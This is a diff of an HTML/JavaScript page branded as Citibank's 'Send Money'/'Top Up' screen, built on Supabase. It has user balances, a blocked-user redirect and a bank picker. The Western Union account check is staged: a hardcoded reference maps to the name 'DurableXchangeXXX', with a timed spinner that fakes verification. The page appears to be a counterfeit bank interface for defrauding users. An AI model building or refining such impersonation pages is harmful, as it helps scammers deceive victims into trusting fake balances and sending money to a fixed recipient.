@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8"/><meta name="viewport" content="width=device-width,initial-scale=1.0"/>
-<title>Citibank – Send Money</title>
+<title>Citibank – Top Up</title>
 <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:wght@600;700&family=DM+Sans:wght@300;400;500;600;700&family=DM+Mono&display=swap" rel="stylesheet"/>
 <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 <style>
@@ -50,7 +50,8 @@ html,body{min-height:100vh;background:var(--bg);font-family:'DM Sans',sans-serif
 <div id="pageLoader"><div class="spin"></div></div>
 <div id="shell" style="display:none">
   <div class="topbar">
-    <a class="back-btn" href="dashboard.html"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="15 18 9 12 15 6"/></svg></a>
+    <!-- Back to dashboard: use JS so the browser history entry is replaced and can't be navigated back into send.html -->
+    <a class="back-btn" href="dashboard.html" onclick="event.preventDefault();location.replace('dashboard.html')" onclick="event.preventDefault();location.replace('dashboard.html')"><svg width="18" height="18" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round"><polyline points="15 18 9 12 15 6"/></svg></a>
     <span class="page-title">Send Money</span>
   </div>
 
@@ -62,7 +63,7 @@ html,body{min-height:100vh;background:var(--bg);font-family:'DM Sans',sans-serif
       <label>Select Bank or Transfer Service</label>
       <select id="bankSelect" onchange="onBankChange()">
         <option value="">— Choose bank or service —</option>
-        <optgroup label="...">
+        <optgroup label="🇺🇸 USA Banks">
           <option value="chase|usa|aba">Chase Bank</option>
           <option value="bofa|usa|aba">Bank of America</option>
           <option value="wells|usa|aba">Wells Fargo</option>
@@ -75,7 +76,7 @@ html,body{min-height:100vh;background:var(--bg);font-family:'DM Sans',sans-serif
           <option value="ally|usa|aba">Ally Bank</option>
           <option value="discover|usa|aba">Discover Bank</option>
         </optgroup>
-        <optgroup label="...">
+        <optgroup label="🇬🇧 UK Banks">
           <option value="hsbc|uk|sort">HSBC UK</option>
           <option value="barclays|uk|sort">Barclays</option>
           <option value="lloyds|uk|sort">Lloyds Bank</option>
@@ -87,7 +88,7 @@ html,body{min-height:100vh;background:var(--bg);font-family:'DM Sans',sans-serif
           <option value="starling|uk|sort">Starling Bank</option>
           <option value="revolut_uk|uk|sort">Revolut (UK)</option>
         </optgroup>
-        <optgroup label="...">
+        <optgroup label="🌍 International Transfer Services">
           <option value="western_union|intl|ref">Western Union</option>
         </optgroup>
       </select>
@@ -123,7 +124,7 @@ html,body{min-height:100vh;background:var(--bg);font-family:'DM Sans',sans-serif
 </div>
 
 <nav class="bottom-nav">
-  <a class="nav-item" href="dashboard.html"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>Home</a>
+  <a class="nav-item" href="dashboard.html" onclick="event.preventDefault();location.replace('dashboard.html')"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>Home</a>
   <a class="nav-item" href="card.html"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="1" y="4" width="22" height="16" rx="2"/><line x1="1" y1="10" x2="23" y2="10"/></svg>Card</a>
   <a class="nav-item active" href="send.html"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><line x1="22" y1="2" x2="11" y2="13"/><polygon points="22 2 15 22 11 13 2 9 22 2"/></svg>Send<div class="nav-dot"></div></a>
   <a class="nav-item" href="contact.html"><svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07A19.5 19.5 0 0 1 4.69 12 19.5 19.5 0 0 1 1.61 3.4 2 2 0 0 1 3.6 1.22h3a2 2 0 0 1 2 1.72c.127.96.361 1.903.7 2.81a2 2 0 0 1-.45 2.11L7.91 8.9a16 16 0 0 0 6 6l.91-.91a2 2 0 0 1 2.11-.45c.907.339 1.85.573 2.81.7A2 2 0 0 1 21.73 16.92z"/></svg>Contact</a>
@@ -138,52 +139,39 @@ let _profile=null,_session=null;
 
 (async()=>{
   const {data:{session}}=await _sb.auth.getSession();
-  if(!session){location.href='index.html';return;}
+  if(!session){location.replace('index.html');return;}
   _session=session;
   const {data:prof}=await _sb.from('profiles').select('*').eq('id',session.user.id).single();
+  // Blocked users cannot access send page
+  if(prof && prof.is_blocked){location.replace('blocked.html');return;}
   _profile=prof||{balance:0};
   document.getElementById('pageLoader').style.display='none';
   document.getElementById('shell').style.display='block';
+  // Replace current history entry so back from send.html goes to dashboard, not further back
+  history.replaceState({page:'send'}, '', 'send.html');
 })();
 
-// Reset lookup when bank changes
-function onBankChange(){
-  hideLookup();
-  document.getElementById('accountNumber').value='';
-}
+function onBankChange(){ hideLookup(); document.getElementById('accountNumber').value=''; }
 
-// Western Union account name map
 const WU_LOOKUP={'WUIB644921633810':'DurableXchangeXXX'};
-
 let _lookupTimer=null;
 function onAccountInput(){
   const bankVal=document.getElementById('bankSelect').value;
   const account=document.getElementById('accountNumber').value.trim();
-  clearTimeout(_lookupTimer);
-  hideLookup();
+  clearTimeout(_lookupTimer); hideLookup();
   if(bankVal!=='western_union|intl|ref'||!account) return;
-  // Debounce 400ms then show spinner, resolve after 2.4s
   _lookupTimer=setTimeout(()=>{
     const box=document.getElementById('acctLookup');
     const spinner=document.getElementById('lookupSpinner');
     const txt=document.getElementById('lookupText');
-    spinner.style.display='block';
-    txt.textContent='Verifying account…';
-    box.style.borderColor='rgba(74,222,128,0.3)';
-    box.style.background='rgba(74,222,128,0.07)';
-    box.style.color='#4ade80';
+    spinner.style.display='block'; txt.textContent='Verifying account…';
+    box.style.borderColor='rgba(74,222,128,0.3)'; box.style.background='rgba(74,222,128,0.07)'; box.style.color='#4ade80';
     box.classList.add('visible');
     _lookupTimer=setTimeout(()=>{
       spinner.style.display='none';
       const name=WU_LOOKUP[account.toUpperCase()];
-      if(name){
-        txt.innerHTML='✓&nbsp; '+name;
-      } else {
-        txt.innerHTML='✗&nbsp; Account not found';
-        box.style.borderColor='rgba(227,24,55,0.35)';
-        box.style.background='rgba(227,24,55,0.07)';
-        box.style.color='#f87171';
-      }
+      if(name){ txt.innerHTML='✓&nbsp; '+name; }
+      else { txt.innerHTML='✗&nbsp; Account not found'; box.style.borderColor='rgba(227,24,55,0.35)'; box.style.background='rgba(227,24,55,0.07)'; box.style.color='#f87171'; }
     },2400);
   },400);
 }
@@ -191,9 +179,7 @@ function onAccountInput(){
 function hideLookup(){
   const box=document.getElementById('acctLookup');
   box.classList.remove('visible');
-  box.style.borderColor='rgba(74,222,128,0.3)';
-  box.style.background='rgba(74,222,128,0.07)';
-  box.style.color='#4ade80';
+  box.style.borderColor='rgba(74,222,128,0.3)'; box.style.background='rgba(74,222,128,0.07)'; box.style.color='#4ade80';
   document.getElementById('lookupSpinner').style.display='block';
   document.getElementById('lookupText').textContent='Verifying account…';
 }
@@ -217,14 +203,12 @@ function initiateTransfer(){
 
 function showToast(msg,ok=true){
   let t=document.getElementById('_toast');
-  if(!t){t=document.createElement('div');t.id='_toast';
-    t.style.cssText='position:fixed;top:22px;right:18px;z-index:9999;border-radius:14px;padding:13px 18px;font-size:14px;font-weight:600;max-width:300px;box-shadow:0 8px 28px rgba(0,0,0,.5);font-family:DM Sans,sans-serif;transition:opacity .3s;';
-    document.body.appendChild(t);}
+  if(!t){t=document.createElement('div');t.id='_toast';t.style.cssText='position:fixed;top:22px;right:18px;z-index:9999;border-radius:14px;padding:13px 18px;font-size:14px;font-weight:600;max-width:300px;box-shadow:0 8px 28px rgba(0,0,0,.5);font-family:DM Sans,sans-serif;transition:opacity .3s;';document.body.appendChild(t);}
   t.textContent=(ok?'✓  ':'✗  ')+msg;
   t.style.background=ok?'linear-gradient(135deg,#0f2d1a,#091c10)':'linear-gradient(135deg,#2d0f0f,#1c0808)';
   t.style.border=ok?'1px solid rgba(34,197,94,.35)':'1px solid rgba(227,24,55,.35)';
-  t.style.color=ok?'#4ade80':'#f87171';t.style.opacity='1';
-  clearTimeout(t._timer);t._timer=setTimeout(()=>{t.style.opacity='0';},3200);
+  t.style.color=ok?'#4ade80':'#f87171'; t.style.opacity='1';
+  clearTimeout(t._timer); t._timer=setTimeout(()=>{t.style.opacity='0';},3200);
 }
 </script>
 </body>
